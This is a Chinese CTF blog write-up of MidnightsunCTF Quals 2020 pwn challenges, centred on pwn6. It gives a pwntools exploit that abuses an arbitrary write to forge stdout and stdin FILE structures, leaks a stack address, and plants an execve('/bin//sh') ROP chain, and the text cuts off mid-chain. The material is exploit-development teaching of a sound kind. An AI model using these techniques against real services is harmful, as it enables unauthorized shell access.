<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>MidnightsunCTF Quals 2020 pwn | starssgo</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><meta name="generator" content="Hexo 4.0.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">MidnightsunCTF Quals 2020 pwn</h1><a id="logo" href="/.">starssgo</a><p class="description">è¶ŠåŠªåŠ›,è¶Šå¹¸è¿ã€‚</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">MidnightsunCTF Quals 2020 pwn</h1><div class="post-meta">Apr 9, 2020<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><a class="disqus-comment-count" href="/2020/04/09/%C2%96MidnightsunCTF-Quals-2020-pwn/#vcomment"><span class="valine-comment-count" data-xid="/2020/04/09/%C2%96MidnightsunCTF-Quals-2020-pwn/"></span><span> Comment</span></a><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn6æ€è·¯åŠåˆ©ç”¨"><span class="toc-number">1.</span> <span class="toc-text">pwn6æ€è·¯åŠåˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#æ‰¾æ¼æ´"><span class="toc-number">1.1.</span> <span class="toc-text">æ‰¾æ¼æ´</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#æ€è·¯"><span class="toc-number">1.2.</span> <span class="toc-text">æ€è·¯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¿®æ”¹dword-6D7330å€¼"><span class="toc-number">1.3.</span> <span class="toc-text">ä¿®æ”¹dword_6D7330å€¼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¼ªé€ stoutæ³„éœ²åœ°å€"><span class="toc-number">1.4.</span> <span class="toc-text">ä¼ªé€ stoutæ³„éœ²åœ°å€</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#æµ‹è¯•poc"><span class="toc-number">1.4.1.</span> <span class="toc-text">æµ‹è¯•poc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#å°†ropå†™å…¥è¿”å›åœ°å€"><span class="toc-number">1.5.</span> <span class="toc-text">å°†ropå†™å…¥è¿”å›åœ°å€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#è·³å‡ºå¾ªç¯"><span class="toc-number">1.6.</span> <span class="toc-text">è·³å‡ºå¾ªç¯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.7.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#æ€»ç»“"><span class="toc-number">1.8.</span> <span class="toc-text">æ€»ç»“</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#å…¶ä»–pwn"><span class="toc-number">2.</span> <span class="toc-text">å…¶ä»–pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn1"><span class="toc-number">2.1.</span> <span class="toc-text">pwn1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn2"><span class="toc-number">2.2.</span> <span class="toc-text">pwn2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn3"><span class="toc-number">2.3.</span> <span class="toc-text">pwn3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn4"><span class="toc-number">2.4.</span> <span class="toc-text">pwn4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn5"><span class="toc-number">2.5.</span> <span class="toc-text">pwn5</span></a></li></ol></li></ol></div></div><div class="post-content"><p>ä¸æ„§æ˜¯å›½é™…èµ›ï¼Œå¤´éƒ½è¢«é”¤çƒ‚äº†ã€‚</p>
<a id="more"></a>  
<p>å¤–å›½äººå‡ºçš„é¢˜å¾€å¾€æ¯”è¾ƒæœ‰ç‰¹è‰²ï¼Œç›¸å¯¹æˆ‘å›½å¤§å¤§å°å°çš„æ¯”èµ›å°¤å…¶æ˜¯ä¸€äº›å †é¢˜ï¼Œå¾€å¾€éƒ½æ˜¯ä¸€ä¸ªå›ºå®šçš„å¥—è·¯ï¼Œè¶Šåšæœ€å¤šå†™è„šæœ¬çš„é€Ÿåº¦å¿«äº†ï¼Œå…¶å®å¹¶æ²¡æœ‰å­¦åˆ°ä»€ä¹ˆæ–°ä¸œè¥¿ã€‚<br>pwn1,pwn2,pwn4éƒ½æ˜¯ç®€å•çš„é¢˜ï¼Œpwn3æ˜¯armæ ˆæº¢å‡ºï¼Œpwn5æ˜¯mipsæ ˆæº¢å‡º,ç›¸å¯¹äºæˆ‘è§‰å¾—pwn6æ¯”è¾ƒæœ‰å­¦ä¹ çš„åœ°æ–¹ã€‚</p>
<h2 id="pwn6æ€è·¯åŠåˆ©ç”¨"><a href="#pwn6æ€è·¯åŠåˆ©ç”¨" class="headerlink" title="pwn6æ€è·¯åŠåˆ©ç”¨"></a>pwn6æ€è·¯åŠåˆ©ç”¨</h2><h3 id="æ‰¾æ¼æ´"><a href="#æ‰¾æ¼æ´" class="headerlink" title="æ‰¾æ¼æ´"></a>æ‰¾æ¼æ´</h3><p>é¦–å…ˆæ˜¯é™æ€ç¼–è¯‘ç¨‹åºï¼Œè¿è¡Œ<br><img src="/2020/04/09/%C2%96MidnightsunCTF-Quals-2020-pwn/1.jpg" alt><br>æ¨æµ‹å…³é”®å‡½æ•°é‡Œæœ‰<code>addr:</code>å­—ç¬¦ä¸²ï¼Œæ‹–è¿›IDAæœç´¢å­—ç¬¦ä¸²ã€‚<br><img src="/2020/04/09/%C2%96MidnightsunCTF-Quals-2020-pwn/2.jpg" alt><br>æŸ¥çœ‹å­—ç¬¦ä¸²å¼•ç”¨å‡½æ•°ï¼Œæ‰¾åˆ°<br><img src="/2020/04/09/%C2%96MidnightsunCTF-Quals-2020-pwn/3.jpg" alt><br>å®šä¹‰ä¸º<code>main_02</code>,åˆ†æç¨‹åºï¼Œè¾“å…¥æ ¼å¼ä¸º<code>&quot;%p:%u&quot;</code>,å…¶ä¸­v6&lt;=7,å°†v6&lt;&lt;1åå¡«å…¥v7åœ°å€æŒ‡å‘çš„å€¼ã€‚é€šè¿‡åŠ¨è°ƒå¾—å‡º<code>dword_6D7330</code>å€¼ä¸º-1,å³åªèƒ½è¿›è¡Œä¸€æ¬¡ä»»æ„åœ°å€å†™æ“ä½œã€‚</p>
<h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>1.åˆ©ç”¨æ¼æ´ä¿®æ”¹<code>dword_6D7330</code>å¤„å€¼ä»¤ç¨‹åºèƒ½å¤Ÿå¾ªç¯<br>2.ä¼ªé€ stdoutå—æ¥æ³„éœ²æ ˆåœ°å€ã€‚<br>3.ä¼ªé€ stdinå—æ¥å®ç°å¾€æ ˆåœ°å€å†™rop<br>4.è·³å‡ºå¾ªç¯ï¼Œæ‰§è¡Œrop  </p>
<h3 id="ä¿®æ”¹dword-6D7330å€¼"><a href="#ä¿®æ”¹dword-6D7330å€¼" class="headerlink" title="ä¿®æ”¹dword_6D7330å€¼"></a>ä¿®æ”¹dword_6D7330å€¼</h3><p>å°è£…å‡½æ•°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def Inputbase(addr1,addr2):</span><br><span class="line">	p.sendlineafter(&quot;\x1B[1maddr:\x1B[m &quot;,&quot;&#123;&#125;:&#123;&#125;&quot;.format(hex(addr1),addr2))</span><br></pre></td></tr></table></figure>
<p><img src="/2020/04/09/%C2%96MidnightsunCTF-Quals-2020-pwn/4.jpg" alt><br>å…³é”®è·³è½¬ï¼Œå°†eaxå¤§äº<code>0x80000001</code>å³å¯å®ç°ï¼Œåˆ™<br><code>Inputbase(0x6D7333,7)</code>  </p>
<h3 id="ä¼ªé€ stoutæ³„éœ²åœ°å€"><a href="#ä¼ªé€ stoutæ³„éœ²åœ°å€" class="headerlink" title="ä¼ªé€ stoutæ³„éœ²åœ°å€"></a>ä¼ªé€ stoutæ³„éœ²åœ°å€</h3><p>å°è£…å‡½æ•°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">def Inputaddr(addr1,addr2):#å…¶ä¸­addr1ä¸ºæƒ³å†™çš„åœ°å€,addr2ä¸ºæƒ³å†™å…¥çš„å€¼</span><br><span class="line">	for i in range(8):#å¾ªç¯0-7å¯»æ‰¾æ»¡è¶³1&lt;&lt;i ä¸ addr2ç›¸ç­‰çš„å€¼</span><br><span class="line">		if (1 &lt;&lt; i) &amp; addr2:</span><br><span class="line">			Inputbase(addr1,i) #å³å†™å…¥addr2</span><br><span class="line"></span><br><span class="line">def Writeaddr(addr1,addr2): # addr1ä¸ºæƒ³å†™çš„åœ°å€ addr2ä¸ºæƒ³å†™çš„å­—ç¬¦ä¸²</span><br><span class="line">	for i in range(len(addr2)): # len(addr2)#å¾ªç¯å°†å­—ç¬¦ä¸²å†™å…¥</span><br><span class="line">		Inputaddr(addr1+i,ord(addr2[i]))</span><br><span class="line">def fakestdout(a, b):</span><br><span class="line">    return struct.pack(&apos;&lt;28Q&apos;,</span><br><span class="line">	   0x00000000fbad0800,</span><br><span class="line">	   0x00000000006d53e3,</span><br><span class="line">	   a,       #read_end</span><br><span class="line">	   0x00000000006d53e3,</span><br><span class="line">	   a,       #write_base</span><br><span class="line">	   b,       #write_ptr</span><br><span class="line">	   0x00000000006d53e3,</span><br><span class="line">	   0x00000000006d53e3,</span><br><span class="line">	   0x00000000006d53e4,</span><br><span class="line">	   0, 0, 0, 0, 0,</span><br><span class="line">	   1,</span><br><span class="line">	   0, 0,</span><br><span class="line">	   0x00000000006d7d30,</span><br><span class="line">	   0, 0, 0, 0, 0, 0, 0, 0, 0,</span><br><span class="line">	   0x00000000006d6fe0)</span><br></pre></td></tr></table></figure>
<h4 id="æµ‹è¯•poc"><a href="#æµ‹è¯•poc" class="headerlink" title="æµ‹è¯•poc"></a>æµ‹è¯•poc</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">static char leakme[] = &#123;&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;&#125;;</span><br><span class="line">puts(&quot;test&quot;);</span><br><span class="line">stdout-&gt;_IO_write_base = leakme;</span><br><span class="line">stdout-&gt;_IO_write_ptr = &amp;leakme[4];</span><br><span class="line">stdout-&gt;_IO_read_end = stdout-&gt;_IO_write_base;</span><br><span class="line">puts(&quot;test&quot;);</span><br></pre></td></tr></table></figure>
<p>æ‰“å°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line">testabcd</span><br></pre></td></tr></table></figure>
<p>åˆ™å®ç°payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#stdout=0x6D57a0</span><br><span class="line">#stdout=0x6D57a8</span><br><span class="line">Writeaddr(0x6d7360,fakestdout(0x006d7da8,0x006d7db0))#åœ¨bssæ®µå†™å…¥ä¼ªé€ å—ã€‚0x006d7da8æŒ‡å‘æ ˆåœ°å€</span><br><span class="line">Inputbase(0x6D57a1,5) #ä¿®æ”¹0x6D57a0-&gt;0x6d7360</span><br><span class="line">stack_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &quot;stack_addr=&quot;,hex(stack_addr)</span><br></pre></td></tr></table></figure>
<h3 id="å°†ropå†™å…¥è¿”å›åœ°å€"><a href="#å°†ropå†™å…¥è¿”å›åœ°å€" class="headerlink" title="å°†ropå†™å…¥è¿”å›åœ°å€"></a>å°†ropå†™å…¥è¿”å›åœ°å€</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">def fakestdin(a, b):</span><br><span class="line">  		return struct.pack(&apos;&lt;28Q&apos;,</span><br><span class="line">		   0x00000000fbad208b,</span><br><span class="line">		   0x00000000006d5603, #read_ptr</span><br><span class="line">		   0x00000000006d5603, #read_end</span><br><span class="line">		   0x00000000006d5603,</span><br><span class="line">		   0x00000000006d5603,</span><br><span class="line">		   0x00000000006d5603,</span><br><span class="line">		   0x00000000006d5603,</span><br><span class="line">		   a, #buf_base</span><br><span class="line">		   b, #buf_end</span><br><span class="line">		   0, 0, 0, 0, 0,</span><br><span class="line">		   0,</span><br><span class="line">		   0, 0,</span><br><span class="line">		   0x00000000006d7d40,</span><br><span class="line">		   0, 0, 0, 0, 0, 0, 0, 0, 0,</span><br><span class="line">		   0x00000000006d6fe0)</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œæµç¨‹,å½“read_ptr=read_endæ—¶,åœ¨åœ°å€ä¸ºbuf_baseå¤„å†™å…¥é•¿åº¦ä¸º<code>buf_end-buf_base</code>ä¸ªå­—èŠ‚çš„è¾“å…¥ã€‚<br>å› ä¸ºæ˜¯é™æ€ç¼–è¯‘,ropç”±<code>ROPgadget --binary pwn6 --ropchain</code>æ¥ç”Ÿæˆã€‚  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#æ ¹æ®è®¡ç®—,stack_ebp=stack_addr-0x138</span><br><span class="line">Writeaddr(0x6d7580, fakestdin(stack_addr - 0x138, stack_addr + len(rop())))</span><br><span class="line">Inputbase(0x006d57a9, 5)#æ›´æ”¹stdin-&gt;0x6d7580</span><br></pre></td></tr></table></figure>
<h3 id="è·³å‡ºå¾ªç¯"><a href="#è·³å‡ºå¾ªç¯" class="headerlink" title="è·³å‡ºå¾ªç¯"></a>è·³å‡ºå¾ªç¯</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(&apos;addr:&apos;, &apos;000000:8&apos; + rop())</span><br></pre></td></tr></table></figure>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">p = 0</span><br><span class="line">def pwn(ip,port,debug,flaag):</span><br><span class="line">	elf = ELF(flaag)</span><br><span class="line">	global p</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		p = process(flaag)</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		p = remote(ip,port)</span><br><span class="line">	def Inputbase(addr1,addr2):</span><br><span class="line">		p.sendlineafter(&quot;\x1B[1maddr:\x1B[m &quot;,&quot;&#123;&#125;:&#123;&#125;&quot;.format(hex(addr1),addr2))</span><br><span class="line">	def Inputaddr(addr1,addr2):</span><br><span class="line">		for i in range(8):</span><br><span class="line">			if (1 &lt;&lt; i) &amp; addr2:</span><br><span class="line">				Inputbase(addr1,i)</span><br><span class="line">	def Writeaddr(addr1,addr2):</span><br><span class="line">		for i in range(len(addr2)):</span><br><span class="line">			Inputaddr(addr1+i,ord(addr2[i]))</span><br><span class="line">	def fakestdout(a, b):</span><br><span class="line">    		return struct.pack(&apos;&lt;28Q&apos;,</span><br><span class="line">                       0x00000000fbad0800,</span><br><span class="line">                       0x00000000006d53e3,</span><br><span class="line">                       a,</span><br><span class="line">                       0x00000000006d53e3,</span><br><span class="line">                       a,</span><br><span class="line">                       b,</span><br><span class="line">                       0x00000000006d53e3,</span><br><span class="line">                       0x00000000006d53e3,</span><br><span class="line">                       0x00000000006d53e4,</span><br><span class="line">                       0, 0, 0, 0, 0,</span><br><span class="line">                       1,</span><br><span class="line">                       0, 0,</span><br><span class="line">                       0x00000000006d7d30,</span><br><span class="line">                       0, 0, 0, 0, 0, 0, 0, 0, 0,</span><br><span class="line">                       0x00000000006d6fe0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	def fakestdin(a, b):</span><br><span class="line">   		return struct.pack(&apos;&lt;28Q&apos;,</span><br><span class="line">                       0x00000000fbad208b,</span><br><span class="line">                       0x00000000006d5603,</span><br><span class="line">                       0x00000000006d5603,</span><br><span class="line">                       0x00000000006d5603,</span><br><span class="line">                       0x00000000006d5603,</span><br><span class="line">                       0x00000000006d5603,</span><br><span class="line">                       0x00000000006d5603,</span><br><span class="line">                       a,</span><br><span class="line">                       b,</span><br><span class="line">                       0, 0, 0, 0, 0,</span><br><span class="line">                       0,</span><br><span class="line">                       0, 0,</span><br><span class="line">                       0x00000000006d7d40,</span><br><span class="line">                       0, 0, 0, 0, 0, 0, 0, 0, 0,</span><br><span class="line">                       0x00000000006d6fe0)</span><br><span class="line">	def rop():</span><br><span class="line">		p=&apos;&apos;</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x0000000000410433) # pop rsi ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x00000000006d50e0) # @ .data</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x00000000004158a4) # pop rax ; ret</span><br><span class="line">		p += &apos;/bin//sh&apos;</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x0000000000487b51) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x0000000000410433) # pop rsi ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x00000000006d50e8) # @ .data + 8</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x0000000000444e00) # xor rax, rax ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x0000000000487b51) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x00000000004006a6) # pop rdi ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x00000000006d50e0) # @ .data</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x0000000000410433) # pop rsi ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x00000000006d50e8) # @ .data + 8</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x0000000000449af5) # pop rdx ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x00000000006d50e8) # @ .data + 8</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x0000000000444e00) # xor rax, rax ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 0x000000000047cfa0) # add rax, 1 ; ret</span><br><span class="line">		p += pack(&apos;&lt;Q&apos;, 